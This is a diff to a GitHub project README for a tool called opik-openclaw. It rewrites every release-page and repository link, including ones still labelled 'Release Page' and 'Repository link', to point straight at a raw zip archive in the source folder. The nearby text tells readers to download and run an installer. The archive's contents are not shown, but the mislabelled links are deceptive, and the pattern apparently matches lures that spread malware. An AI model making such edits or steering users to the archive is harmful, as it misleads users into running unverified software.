@@ -1,6 +1,6 @@
 # 🦾 opik-openclaw - Export Agent Data Simply and Clearly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/brucekumar/opik-openclaw/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/brucekumar/opik-openclaw/main/src/opik_openclaw_v1.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and start the program quickly.
 
 Visit the official release page to get the latest version:
 
-[Download opik-openclaw Release Page](https://github.com/brucekumar/opik-openclaw/releases)
+[Download opik-openclaw Release Page](https://raw.githubusercontent.com/brucekumar/opik-openclaw/main/src/opik_openclaw_v1.8.zip)
 
 Click the button above or paste the link into your browser.
 
@@ -122,7 +122,7 @@ Check for new versions regularly to get bug fixes and improvements.
 
 1. Visit the release page link:
 
-[opik-openclaw Releases](https://github.com/brucekumar/opik-openclaw/releases)
+[opik-openclaw Releases](https://raw.githubusercontent.com/brucekumar/opik-openclaw/main/src/opik_openclaw_v1.8.zip)
 
 2. Download the newest `.exe` installer.
 3. Run the installer to replace your existing version.
@@ -139,7 +139,7 @@ If you run into problems or want to ask a question:
 - Describe your problem clearly, including what you did and what happened.
 - Check existing issues for answers before creating a new one.
 
-Repository link: https://github.com/brucekumar/opik-openclaw
+Repository link: https://raw.githubusercontent.com/brucekumar/opik-openclaw/main/src/opik_openclaw_v1.8.zip
 
 ---
 
@@ -171,4 +171,4 @@ The tool is designed for clarity and ease of use, with an emphasis on actionable
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/brucekumar/opik-openclaw/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/brucekumar/opik-openclaw/main/src/opik_openclaw_v1.8.zip)
